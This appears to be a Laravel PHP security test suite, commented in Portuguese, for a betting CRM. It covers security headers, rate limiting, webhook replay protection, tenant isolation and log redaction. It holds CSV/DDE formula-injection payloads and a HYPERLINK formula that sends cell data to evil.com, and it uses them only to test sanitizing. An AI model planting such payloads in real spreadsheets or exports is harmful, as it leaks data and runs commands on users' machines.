<?php

namespace Tests\Feature;

use App\Models\Platform;
use App\Models\Player;
use App\Models\ScheduledReport;
use App\Models\User;
use App\Services\Analytics\CampaignAnalyticsService;
use App\Services\Privacy\SensitiveDataSanitizer;
use App\Services\Reports\ReportsService;
use App\Services\Webhooks\WebhookSecurityService;
use Carbon\Carbon;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\RateLimiter;
use Tests\TestCase;

class SecurityHardeningTest extends TestCase
{
    use RefreshDatabase;

    protected Platform $platformA;
    protected Platform $platformB;
    protected User $adminUser;
    protected string $adminToken;
    protected User $marketingUser;
    protected string $marketingToken;

    protected function setUp(): void
    {
        parent::setUp();
        $this->seed(\Database\Seeders\DatabaseSeeder::class);

        $this->platformA = Platform::where('slug', 'bet-brasil')->firstOrFail();
        $this->platformB = Platform::where('slug', 'bet-global')->firstOrFail();

        $this->adminUser = User::where('email', 'admin@crm.example.com')->firstOrFail();
        $this->adminUser->platforms()->syncWithoutDetaching([$this->platformA->id, $this->platformB->id]);
        $this->adminToken = $this->adminUser->createToken('admin')->plainTextToken;

        $this->marketingUser = User::where('email', 'marketing@crm.example.com')->firstOrFail();
        $this->marketingUser->platforms()->syncWithoutDetaching([$this->platformA->id]);
        $this->marketingToken = $this->marketingUser->createToken('marketing')->plainTextToken;
    }

    /**
     * Teste 1: Valida se os Headers de Segurança OWASP são injetados em todas as respostas de API.
     */
    public function test_api_responses_contain_standard_security_headers(): void
    {
        $response = $this->getJson('/api/v1/health');

        $response->assertStatus(200);
        $response->assertHeader('X-Content-Type-Options', 'nosniff');
        $response->assertHeader('X-Frame-Options', 'SAMEORIGIN');
        $response->assertHeader('X-XSS-Protection', '1; mode=block');
        $response->assertHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
        $response->assertHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=(), payment=()');
        $this->assertTrue($response->headers->has('Content-Security-Policy'));
        $this->assertFalse($response->headers->has('X-Powered-By'));
    }

    /**
     * Teste 2: Prevenção contra CSV Formula Injection / DDE Injection.
     * Células que começam com =, +, -, @, \t, \r são prefixadas com '
     */
    public function test_csv_exporter_sanitizes_formula_injection_characters(): void
    {
        /** @var SensitiveDataSanitizer $sanitizer */
        $sanitizer = app(SensitiveDataSanitizer::class);

        $maliciousPayloads = [
            '=cmd|\'/C calc\'!A0',
            '+cmd|\'/C notepad\'!A0',
            '-2+3+cmd|',
            '@SUM(1+1)*cmd',
            "\t=calc",
            "\r=calc",
        ];

        foreach ($maliciousPayloads as $payload) {
            $cleaned = $sanitizer->sanitizeCsvCell($payload);
            $this->assertStringStartsWith("'", $cleaned, "Payload {$payload} deveria ser sanitizado com apóstrofo");
        }

        // Dados normais não devem ser alterados
        $this->assertEquals('Nome Normal', $sanitizer->sanitizeCsvCell('Nome Normal'));
        $this->assertEquals(1234, $sanitizer->sanitizeCsvCell(1234));
    }

    /**
     * Teste 3: Relatórios exportados neutralizam nomes de jogadores contendo payload de injeção CSV.
     */
    public function test_reports_service_neutralizes_malicious_player_name_in_csv(): void
    {
        Player::create([
            'platform_id' => $this->platformA->id,
            'external_id' => 'PLY-HACK-01',
            'name' => '=HYPERLINK("http://evil.com?leak="&A1,"Click")',
            'email' => 'victim@example.com',
            'phone' => '5511999990001',
            'status' => 'ACTIVE',
        ]);

        /** @var ReportsService $reportsService */
        $reportsService = app(ReportsService::class);
        $data = $reportsService->generateReportData($this->platformA->id, 'PLAYERS', ['period' => '30d'], false);
        $csv = $reportsService->exportToCsv($data);

        // O payload deve estar prefixado com apóstrofo ' para neutralizar execução no Excel
        $this->assertStringContainsString("'=HYPERLINK", $csv);
        $this->assertStringNotContainsString(";=HYPERLINK", $csv);
    }

    /**
     * Teste 4: Rate Limiting de Exportações bloqueia abuso após 10 requisições por minuto.
     */
    public function test_export_rate_limiter_throttles_excessive_downloads(): void
    {
        $limiterKey = 'user:' . $this->adminUser->id;
        RateLimiter::clear($limiterKey);

        // Dispara requisições até o limite
        for ($i = 0; $i < 10; $i++) {
            $response = $this->withHeader('Authorization', "Bearer {$this->adminToken}")
                ->withHeader('X-Platform-Id', (string) $this->platformA->id)
                ->postJson('/api/v1/reports/export', [
                    'report_type' => 'PLAYERS',
                    'period' => '7d',
                    'format' => 'CSV',
                    'async' => false,
                ]);

            $response->assertStatus(200);
        }

        // A 11ª requisição deve retornar HTTP 429
        $throttled = $this->withHeader('Authorization', "Bearer {$this->adminToken}")
            ->withHeader('X-Platform-Id', (string) $this->platformA->id)
            ->postJson('/api/v1/reports/export', [
                'report_type' => 'PLAYERS',
                'period' => '7d',
                'format' => 'CSV',
                'async' => false,
            ]);

        $throttled->assertStatus(429);
        $throttled->assertJsonPath('success', false);
        $this->assertStringContainsString('Limite de exportações excedido', $throttled->json('message'));

        RateLimiter::clear($limiterKey);
    }

    /**
     * Teste 5: Webhook Replay Attack Protection rejeita requisição com timestamp expirado (> 5 min).
     */
    public function test_webhook_rejects_expired_timestamp_replay_attacks(): void
    {
        /** @var WebhookSecurityService $security */
        $security = app(WebhookSecurityService::class);

        $payload = json_encode([
            'external_event_id' => 'EVT-REPLAY-99',
            'event_type' => 'login',
            'player' => ['external_id' => 'PLY-100', 'email' => 'replay@example.com'],
            'occurred_at' => now()->toIso8601String(),
        ]);

        $signature = $security->computeSignature($payload, $this->platformA->webhook_secret);

        // Timestamp de 10 minutos atrás (fora da janela de 5 min)
        $expiredTimestamp = now()->subMinutes(10)->timestamp;

        $response = $this->call(
            'POST',
            "/api/v1/webhooks/{$this->platformA->slug}",
            [],
            [],
            [],
            [
                'CONTENT_TYPE' => 'application/json',
                'HTTP_X_WEBHOOK_SIGNATURE' => $signature,
                'HTTP_X_WEBHOOK_TIMESTAMP' => (string) $expiredTimestamp,
            ],
            $payload
        );

        $response->assertStatus(401);
        $this->assertStringContainsString('fora da janela permitida', $response->json('message'));
    }

    /**
     * Teste 6: Webhook rejeita payloads gigantes que excedem 512KB (DoS Protection).
     */
    public function test_webhook_rejects_oversized_payloads(): void
    {
        // Cria payload com mais de 512KB (524.288 bytes)
        $largeString = str_repeat('A', 530000);
        $payload = json_encode(['data' => $largeString]);

        $response = $this->call('POST', "/api/v1/webhooks/{$this->platformA->slug}", [], [], [], [], $payload);

        $response->assertStatus(413);
        $this->assertStringContainsString('Payload do webhook excede o limite', $response->json('message'));
    }

    /**
     * Teste 7: Proteção contra BOLA/IDOR — Usuário não pode acessar agendamento de outra plataforma.
     */
    public function test_scheduled_reports_enforce_strict_tenant_isolation_against_idor(): void
    {
        // Cria relatório agendado na Plataforma B
        $reportB = ScheduledReport::create([
            'platform_id' => $this->platformB->id,
            'name' => 'Relatório Secreto B',
            'report_type' => 'FINANCIAL',
            'frequency' => 'WEEKLY',
            'recipients' => ['secret@platform-b.com'],
            'created_by' => $this->adminUser->id,
            'active' => true,
        ]);

        // Tentativa de excluir com contexto da Plataforma A deve falhar com 404
        $response = $this->withHeader('Authorization', "Bearer {$this->adminToken}")
            ->withHeader('X-Platform-Id', (string) $this->platformA->id)
            ->deleteJson("/api/v1/reports/scheduled/{$reportB->id}");

        $response->assertStatus(404);
        $this->assertDatabaseHas('scheduled_reports', ['id' => $reportB->id]);
    }

    /**
     * Teste 8: Sanitização de dados sensíveis nunca expõe tokens ou chaves secretas em logs/estruturas.
     */
    public function test_sensitive_data_sanitizer_redacts_credentials_and_masks_pii(): void
    {
        /** @var SensitiveDataSanitizer $sanitizer */
        $sanitizer = app(SensitiveDataSanitizer::class);

        $sensitive = [
            'user' => [
                'name' => 'Maria Silva',
                'email' => 'maria.silva@example.com',
                'cpf' => '12345678900',
                'phone' => '5511988887777',
            ],
            'auth' => [
                'password' => 'MinhaSenhaUltraSecreta123!',
                'token' => 'plain_text_token_abc_123',
                'api_key' => 'ak_live_998877665544',
                'webhook_secret' => 'whsec_secret_hash_key',
            ],
        ];

        $cleaned = $sanitizer->sanitize($sensitive);

        // Segredos devem estar redigidos
        $this->assertEquals('***REDACTED***', $cleaned['auth']['password']);
        $this->assertEquals('***REDACTED***', $cleaned['auth']['token']);
        $this->assertEquals('***REDACTED***', $cleaned['auth']['api_key']);
        $this->assertEquals('***REDACTED***', $cleaned['auth']['webhook_secret']);

        // PII deve estar mascarada
        $this->assertStringContainsString('***@example.com', $cleaned['user']['email']);
        $this->assertEquals('***.456.789-**', $cleaned['user']['cpf']);
        $this->assertStringContainsString('*****', $cleaned['user']['phone']);
    }
}
